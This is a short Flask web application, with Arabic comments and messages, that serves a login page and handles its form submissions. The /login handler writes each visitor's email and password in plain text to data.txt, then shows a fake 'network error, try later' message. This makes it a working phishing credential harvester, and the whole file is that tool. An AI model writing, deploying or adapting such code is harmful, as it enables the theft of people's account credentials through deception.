from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    # حفظ المعلومات في ملف نصي اسمه data.txt
    with open("data.txt", "a") as f:
        f.write(f"Email: {email} | Pass: {password}\n")
    return "خطأ في الشبكة، حاول لاحقاً"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
